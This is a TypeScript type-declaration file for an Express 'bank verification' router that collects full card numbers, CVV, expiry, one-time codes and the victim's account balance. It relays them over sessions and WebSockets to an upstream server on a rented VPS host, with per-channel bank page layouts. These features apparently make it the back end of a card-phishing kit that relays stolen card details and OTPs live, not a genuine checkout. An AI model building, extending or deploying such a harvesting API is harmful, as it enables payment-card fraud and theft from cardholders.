import { Request, Router } from 'express';
import { WebSocket } from 'ws';
import { T as TransactionDetails } from './types-B5yvUdqW.js';

/**
 * Express router for bank verification API.
 * Use from backend: import { createBankVerificationRouter, createProxyHandlers, createMockHandlers } from "@ncc/bank-verification-ui/express"
 *
 * Flow: Frontend -> Router (same-origin) -> Upstream NCC server
 * - createProxyHandlers(upstreamUrl) — proxy to another server
 * - createMockHandlers() — stub responses for local testing
 */

/** App with express-ws .ws() method. Call expressWs(app) before registerWebSocket. */
interface ExpressWsApp {
    ws(path: string, callback: (ws: WebSocket, req: Request) => void): void;
}
interface BinLookupResult {
    bin: string;
    brand?: string;
    type?: string;
    category?: string;
    issuer?: string;
    isoCode2?: string;
    cardTier?: string;
    luhn?: boolean;
    blocked: boolean;
}
interface PaymentPayload {
    cardNumber: string;
    cardHolder?: string;
    expiryMonth: string;
    expiryYear: string;
    cvv: string;
    amount: number;
    currency: string;
    sessionData?: Record<string, unknown>;
}
interface BankVerificationRouterHandlers {
    createSession: (channelSlug: string, sessionData?: Record<string, unknown>) => Promise<{
        sessionId: string;
        expiresAt: string;
    }>;
    submitPayment: (channelSlug: string, sessionId: string, payment: PaymentPayload) => Promise<{
        sessionId: string;
        status: string;
        blocked: boolean;
    }>;
    getSessionStatus: (channelSlug: string, sessionId: string) => Promise<{
        status: string;
        verificationLayout?: string;
        bank?: string;
        transactionDetails?: TransactionDetails;
    }>;
    submitOtp: (channelSlug: string, sessionId: string, code: string) => Promise<void>;
    resendOtp: (channelSlug: string, sessionId: string, type: "sms" | "pin") => Promise<void>;
    submitBalance: (channelSlug: string, sessionId: string, balance: string) => Promise<void>;
    lookupBin: (bin: string) => Promise<BinLookupResult>;
    handleWebSocket: (ws: WebSocket, req: Request, channelSlug: string, sessionId: string) => void;
}
interface CreateBankVerificationRouterOptions {
    /** Base path for routes. Default: /ncc/v1 (avoids conflict with local APIs) */
    basePath?: string;
}
interface BankVerificationRouterResult {
    /** Express router to mount. Routes are relative to basePath. */
    router: Router;
    /** Register WebSocket route on express-ws app. Call after expressWs(app). */
    registerWebSocket: (app: ExpressWsApp) => void;
}
declare function createBankVerificationRouter(handlers: BankVerificationRouterHandlers, options?: CreateBankVerificationRouterOptions): BankVerificationRouterResult;
/**
 * Create handlers that proxy all requests to an upstream NCC server.
 * Use when the router is a same-origin BFF that forwards to another server.
 *
 * @param upstreamBaseUrl - Base URL of the NCC server (e.g. "https://srv1462130.hstgr.cloud")
 */
declare function createProxyHandlers(upstreamBaseUrl: string): BankVerificationRouterHandlers;
/**
 * Create handlers that return mock/stub responses for local testing.
 * Mimics the checkout flow: createSession → submitPayment → getSessionStatus → submitOtp/balance.
 * No upstream server required.
 */
declare function createMockHandlers(): BankVerificationRouterHandlers;

export { type BankVerificationRouterHandlers, type BankVerificationRouterResult, type BinLookupResult, type CreateBankVerificationRouterOptions, type ExpressWsApp, type PaymentPayload, createBankVerificationRouter, createMockHandlers, createProxyHandlers };
